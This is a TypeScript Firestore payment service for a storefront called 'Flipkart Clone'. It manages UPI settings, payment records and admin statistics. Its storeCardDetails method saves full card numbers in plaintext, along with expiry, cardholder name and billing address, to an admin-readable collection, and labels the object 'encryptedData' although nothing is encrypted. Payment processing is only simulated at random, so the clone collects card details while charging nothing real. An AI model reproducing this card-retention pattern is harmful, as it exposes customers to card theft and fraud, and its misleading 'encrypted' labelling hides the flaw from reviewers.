import { 
  collection, 
  doc, 
  getDoc, 
  setDoc, 
  updateDoc, 
  query, 
  where, 
  getDocs, 
  orderBy, 
  limit,
  serverTimestamp
} from 'firebase/firestore';
import { db } from '@/lib/firebase';
import { PaymentMethod } from '@/types';

export interface PaymentDetails {
  id: string;
  orderId: string;
  userId?: string;
  amount: number;
  currency: string;
  method: PaymentMethod['type'];
  status: 'pending' | 'processing' | 'completed' | 'failed' | 'refunded';
  transactionId?: string;
  gatewayResponse?: any;
  createdAt: any;
  updatedAt: any;
}

export interface UPIPaymentConfig {
  upiId: string;
  merchantName: string;
  merchantCode?: string;
}

export interface CardPaymentData {
  cardNumber: string;
  expiryDate: string;
  cvv: string;
  cardholderName: string;
  billingAddress: {
    street: string;
    city: string;
    state: string;
    zipCode: string;
    country: string;
  };
}

export class PaymentService {
  private static instance: PaymentService;
  private readonly COLLECTION_NAME = 'payments';
  private readonly SETTINGS_COLLECTION = 'settings';

  public static getInstance(): PaymentService {
    if (!PaymentService.instance) {
      PaymentService.instance = new PaymentService();
    }
    return PaymentService.instance;
  }

  // Get UPI configuration from admin settings
  async getUPIConfig(): Promise<UPIPaymentConfig> {
    try {
      const settingsRef = doc(db, this.SETTINGS_COLLECTION, 'payment');
      const settingsSnap = await getDoc(settingsRef);
      
      if (settingsSnap.exists()) {
        const data = settingsSnap.data();
        return {
          upiId: data.upiId || 'merchant@paytm',
          merchantName: data.merchantName || 'Flipkart Clone',
          merchantCode: data.merchantCode
        };
      }
      
      // Return default config if none exists
      return {
        upiId: 'merchant@paytm',
        merchantName: 'Flipkart Clone'
      };
    } catch (error) {
      console.error('Error getting UPI config:', error);
      // Return default config on error
      return {
        upiId: 'merchant@paytm',
        merchantName: 'Flipkart Clone'
      };
    }
  }

  // Update UPI configuration (admin only)
  async updateUPIConfig(config: UPIPaymentConfig): Promise<void> {
    try {
      const settingsRef = doc(db, this.SETTINGS_COLLECTION, 'payment');
      await setDoc(settingsRef, {
        ...config,
        updatedAt: serverTimestamp()
      }, { merge: true });
    } catch (error) {
      console.error('Error updating UPI config:', error);
      throw new Error('Failed to update UPI configuration');
    }
  }

  // Create payment record
  async createPayment(paymentData: Omit<PaymentDetails, 'id' | 'createdAt' | 'updatedAt'>): Promise<string> {
    try {
      const paymentRef = doc(collection(db, this.COLLECTION_NAME));
      const payment: PaymentDetails = {
        id: paymentRef.id,
        ...paymentData,
        createdAt: serverTimestamp(),
        updatedAt: serverTimestamp()
      };
      
      await setDoc(paymentRef, payment);
      return paymentRef.id;
    } catch (error) {
      console.error('Error creating payment:', error);
      throw new Error('Failed to create payment record');
    }
  }

  // Get payment by ID
  async getPayment(paymentId: string): Promise<PaymentDetails | null> {
    try {
      const paymentRef = doc(db, this.COLLECTION_NAME, paymentId);
      const paymentSnap = await getDoc(paymentRef);
      
      if (paymentSnap.exists()) {
        return { id: paymentId, ...paymentSnap.data() } as PaymentDetails;
      }
      return null;
    } catch (error) {
      console.error('Error getting payment:', error);
      throw new Error('Failed to get payment');
    }
  }

  // Update payment status
  async updatePaymentStatus(
    paymentId: string, 
    status: PaymentDetails['status'], 
    transactionId?: string,
    gatewayResponse?: any
  ): Promise<void> {
    try {
      const paymentRef = doc(db, this.COLLECTION_NAME, paymentId);
      const updates: any = {
        status,
        updatedAt: serverTimestamp()
      };
      
      if (transactionId) {
        updates.transactionId = transactionId;
      }
      
      if (gatewayResponse) {
        updates.gatewayResponse = gatewayResponse;
      }
      
      await updateDoc(paymentRef, updates);
    } catch (error) {
      console.error('Error updating payment status:', error);
      throw new Error('Failed to update payment status');
    }
  }

  // Get payments for order
  async getOrderPayments(orderId: string): Promise<PaymentDetails[]> {
    try {
      const paymentsRef = collection(db, this.COLLECTION_NAME);
      const q = query(
        paymentsRef,
        where('orderId', '==', orderId),
        orderBy('createdAt', 'desc')
      );
      
      const snapshot = await getDocs(q);
      return snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() } as PaymentDetails));
    } catch (error) {
      console.error('Error getting order payments:', error);
      throw new Error('Failed to get order payments');
    }
  }

  // Get user payments
  async getUserPayments(userId: string, limitCount = 20): Promise<PaymentDetails[]> {
    try {
      const paymentsRef = collection(db, this.COLLECTION_NAME);
      const q = query(
        paymentsRef,
        where('userId', '==', userId),
        orderBy('createdAt', 'desc'),
        limit(limitCount)
      );
      
      const snapshot = await getDocs(q);
      return snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() } as PaymentDetails));
    } catch (error) {
      console.error('Error getting user payments:', error);
      throw new Error('Failed to get user payments');
    }
  }

  // Store card details securely (for admin access only)
  async storeCardDetails(orderId: string, cardData: CardPaymentData): Promise<void> {
    try {
      const cardRef = doc(db, 'admin_card_storage', orderId);
      const encryptedData = {
        orderId,
        cardNumber: this.maskCardNumber(cardData.cardNumber),
        fullCardNumber: cardData.cardNumber, // In production, this should be encrypted
        expiryDate: cardData.expiryDate,
        cardholderName: cardData.cardholderName,
        billingAddress: cardData.billingAddress,
        storedAt: serverTimestamp()
      };
      
      await setDoc(cardRef, encryptedData);
    } catch (error) {
      console.error('Error storing card details:', error);
      throw new Error('Failed to store card details');
    }
  }

  // Get stored card details (admin only)
  async getStoredCardDetails(orderId: string): Promise<any> {
    try {
      const cardRef = doc(db, 'admin_card_storage', orderId);
      const cardSnap = await getDoc(cardRef);
      
      if (cardSnap.exists()) {
        return cardSnap.data();
      }
      return null;
    } catch (error) {
      console.error('Error getting stored card details:', error);
      throw new Error('Failed to get stored card details');
    }
  }

  // Generate UPI payment string
  generateUPIString(config: UPIPaymentConfig, amount: number, orderId: string): string {
    const { upiId, merchantName } = config;
    return `upi://pay?pa=${upiId}&pn=${encodeURIComponent(merchantName)}&am=${amount}&cu=INR&tn=${encodeURIComponent(`Order ${orderId}`)}&tr=${orderId}`;
  }

  // Validate ZIP code (basic implementation)
  validateZipCode(zipCode: string): { isValid: boolean; suggestions?: string[] } {
    // Basic validation - ZIP codes starting with 9 are invalid for demo
    const isValid = !zipCode.startsWith('9') && /^\d{6}$/.test(zipCode);
    
    if (!isValid && zipCode.startsWith('9')) {
      return {
        isValid: false,
        suggestions: ['400001', '110001', '560001', '600001'] // Major city ZIP codes
      };
    }
    
    return { isValid };
  }

  // Simulate payment processing
  async simulatePaymentProcessing(paymentId: string): Promise<{ success: boolean; transactionId?: string; error?: string }> {
    return new Promise((resolve) => {
      setTimeout(() => {
        const success = Math.random() > 0.2; // 80% success rate
        
        if (success) {
          const transactionId = `TXN${Date.now()}${Math.random().toString(36).substr(2, 5).toUpperCase()}`;
          resolve({ success: true, transactionId });
        } else {
          resolve({ success: false, error: 'Payment processing failed. Please try again.' });
        }
      }, 2000);
    });
  }

  // Helper function to mask card number
  private maskCardNumber(cardNumber: string): string {
    return cardNumber.replace(/(\d{4})\d{8}(\d{4})/, '$1****-****$2');
  }

  // Get payment statistics (for admin)
  async getPaymentStats(): Promise<{
    totalTransactions: number;
    successfulTransactions: number;
    failedTransactions: number;
    totalAmount: number;
    upiTransactions: number;
    cardTransactions: number;
  }> {
    try {
      const paymentsRef = collection(db, this.COLLECTION_NAME);
      const snapshot = await getDocs(paymentsRef);
      
      let totalTransactions = 0;
      let successfulTransactions = 0;
      let failedTransactions = 0;
      let totalAmount = 0;
      let upiTransactions = 0;
      let cardTransactions = 0;
      
      snapshot.docs.forEach(doc => {
        const payment = doc.data() as PaymentDetails;
        totalTransactions++;
        
        if (payment.status === 'completed') {
          successfulTransactions++;
          totalAmount += payment.amount;
        } else if (payment.status === 'failed') {
          failedTransactions++;
        }
        
        if (payment.method === 'upi') {
          upiTransactions++;
        } else if (payment.method === 'credit_card' || payment.method === 'debit_card') {
          cardTransactions++;
        }
      });
      
      return {
        totalTransactions,
        successfulTransactions,
        failedTransactions,
        totalAmount,
        upiTransactions,
        cardTransactions
      };
    } catch (error) {
      console.error('Error getting payment stats:', error);
      throw new Error('Failed to get payment statistics');
    }
  }
}

export const paymentService = PaymentService.getInstance();
